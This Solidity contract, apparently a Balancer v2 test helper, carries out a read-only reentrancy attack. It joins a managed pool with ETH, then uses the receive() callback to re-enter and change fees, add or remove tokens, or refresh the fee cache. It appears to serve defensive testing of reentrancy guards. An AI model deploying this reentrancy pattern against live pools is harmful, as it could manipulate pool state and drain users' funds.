// SPDX-License-Identifier: GPL-3.0-or-later
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "@balancer-labs/v2-interfaces/contracts/vault/IVault.sol";
import "@balancer-labs/v2-interfaces/contracts/pool-utils/IProtocolFeeCache.sol";
import "@balancer-labs/v2-interfaces/contracts/pool-utils/IManagedPool.sol";

/**
 * @notice Performs a read-only reentrancy attack on a target weighted pool, making use of the `receive` callback hook
 * in the middle of a join operation.
 */
contract ReadOnlyReentrancyAttackerMP {
    enum AttackType {
        SET_MANAGEMENT_AUM_FEE,
        COLLECT_AUM_MANAGEMENT_FEES,
        ADD_TOKEN,
        REMOVE_TOKEN,
        UPDATE_PROTOCOL_FEE_CACHE
    }

    IVault private immutable _vault;
    AttackType private _attackType;
    bytes32 private _poolId;

    constructor(IVault vault) {
        _vault = vault;
    }

    /**
     * @dev Starts attack on target pool.
     * The contract needs to have the necessary funds as specified in the given `IVault.JoinPoolRequest` (i.e. the
     * correct tokens and quantities) before this function is called.
     *
     * This function must be called with a non-zero ETH value.
     *
     * @param poolId Pool ID to attack.
     * @param joinPoolRequest Join request, compatible with pool ID. Token amounts can be anything that triggers
     * a valid join in the pool.
     * @param attackType Type of attack; determines which vulnerable pool function to call.
     */
    function startAttack(
        bytes32 poolId,
        IVault.JoinPoolRequest memory joinPoolRequest,
        AttackType attackType
    ) external payable {
        require(msg.value > 0, "Insufficient ETH");
        _attackType = attackType;
        _poolId = poolId;

        uint256 assetsLength = joinPoolRequest.assets.length;
        IVault vault = _vault;
        for (uint256 i = 0; i < assetsLength; ++i) {
            IERC20 asset = IERC20(address(joinPoolRequest.assets[i]));
            asset.approve(address(vault), joinPoolRequest.maxAmountsIn[i]);
        }

        vault.joinPool{ value: msg.value }(poolId, address(this), address(this), joinPoolRequest);
    }

    receive() external payable {
        _reenterAttack();
    }

    function _reenterAttack() internal {
        AttackType attackType = _attackType;
        (address pool, ) = _vault.getPool(_poolId);

        if (attackType == AttackType.SET_MANAGEMENT_AUM_FEE) {
            uint256 aumFeePercentage = 50e16; // 50%

            IManagedPool(pool).setManagementAumFeePercentage(aumFeePercentage);
        } else if (attackType == AttackType.COLLECT_AUM_MANAGEMENT_FEES) {
            IManagedPool(pool).collectAumManagementFees();
        } else if (attackType == AttackType.ADD_TOKEN) {
            IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
            uint256 tokenWeight = 1e16; // 1%
            address recipient = address(this);

            IManagedPool(pool).addToken(weth, address(0), tokenWeight, 0, recipient);
        } else if (attackType == AttackType.REMOVE_TOKEN) {
            (IERC20[] memory tokens, , ) = _vault.getPoolTokens(_poolId);
            address sender = address(this);

            IManagedPool(pool).removeToken(tokens[1], 0, sender);
        } else if (attackType == AttackType.UPDATE_PROTOCOL_FEE_CACHE) {
            IProtocolFeeCache(pool).updateProtocolFeePercentageCache();
        }
    }
}
